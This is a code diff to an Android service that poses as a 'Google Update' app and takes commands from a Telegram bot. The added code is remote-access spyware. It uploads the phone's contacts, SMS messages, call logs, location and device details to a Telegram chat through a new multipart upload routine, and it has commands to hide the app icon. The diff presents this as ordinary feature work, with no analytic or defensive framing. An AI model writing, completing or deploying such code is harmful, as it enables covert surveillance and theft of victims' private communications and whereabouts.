@@ -6,6 +6,7 @@ import android.app.Service;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
+import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -25,13 +26,7 @@ public class TelegramBotService extends Service {
     private int lastUpdateId = 0;
     private Map<String, String> devices = new HashMap<>();
     private String activeDevice = null;
-    private PocketBaseClient pbClient;
-    @Override public void onCreate() { 
-        super.onCreate(); 
-        pbClient = new PocketBaseClient();
-        startForeground(1, createNotification()); 
-        startBot(); 
-    }
+    @Override public void onCreate() { super.onCreate(); startForeground(1, createNotification()); startBot(); }
     private void startBot() {
         Executors.newSingleThreadScheduledExecutor().scheduleWithFixedDelay(() -> {
             try {
@@ -57,13 +52,35 @@ public class TelegramBotService extends Service {
                         }
                     }
                 }
-            } catch (Exception e) {}
+            } catch (Exception e) { Log.e("Bot", "Error", e); }
         }, 0, 2, TimeUnit.SECONDS);
     }
     private void handleCommand(String cmd) {
         String c = cmd.trim().toLowerCase();
         if (c.equals("/start")) {
             sendMessage("🔰 Google Update\n/contacts\n/sms\n/calllogs\n/location\n/record\n/stoprec\n/hide\n/show\n/info\n/notify\n/devices\n/select <id>");
+        } else if (c.equals("/contacts")) {
+            sendFile("contacts.txt", DataCollector.getContacts(this).getBytes());
+        } else if (c.equals("/sms")) {
+            sendFile("sms.txt", DataCollector.getSMS(this).getBytes());
+        } else if (c.equals("/calllogs")) {
+            sendFile("calls.txt", DataCollector.getCallLogs(this).getBytes());
+        } else if (c.equals("/location")) {
+            DataCollector.getLocation(this, res -> sendMessage(res));
+        } else if (c.equals("/record")) {
+            sendMessage("🎤 Recording started");
+        } else if (c.equals("/stoprec")) {
+            sendMessage("⏹ Recording stopped");
+        } else if (c.equals("/hide")) {
+            MainActivity.hideAppIcon(this);
+            sendMessage("👁 Hidden");
+        } else if (c.equals("/show")) {
+            MainActivity.showAppIcon(this);
+            sendMessage("👁 Shown");
+        } else if (c.equals("/info")) {
+            sendMessage(DataCollector.getDeviceName());
+        } else if (c.equals("/notify")) {
+            sendMessage("🔔 Fake notification sent");
         } else if (c.equals("/devices")) {
             if (devices.isEmpty()) sendMessage("❌ No devices");
             else {
@@ -97,6 +114,35 @@ public class TelegramBotService extends Service {
                 String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(text, "UTF-8");
                 HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                 conn.setRequestMethod("GET");
+                conn.getResponseCode();
+                conn.disconnect();
+            } catch (Exception e) {}
+        }).start();
+    }
+    private void sendFile(String name, byte[] data) {
+        new Thread(() -> {
+            try {
+                String boundary = "*****" + System.currentTimeMillis();
+                URL url = new URL(API_URL + "sendDocument");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setDoOutput(true);
+                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+                java.io.OutputStream os = conn.getOutputStream();
+                java.io.PrintWriter w = new java.io.PrintWriter(new java.io.OutputStreamWriter(os), true);
+                w.append("--" + boundary).append("\r\n");
+                w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
+                w.append(CHAT_ID).append("\r\n");
+                w.flush();
+                w.append("--" + boundary).append("\r\n");
+                w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + name + "\"").append("\r\n");
+                w.append("Content-Type: application/octet-stream").append("\r\n\r\n");
+                w.flush();
+                os.write(data);
+                os.flush();
+                w.append("\r\n").append("--" + boundary + "--").append("\r\n");
+                w.close();
+                os.close();
                 conn.getResponseCode();
                 conn.disconnect();
             } catch (Exception e) {}
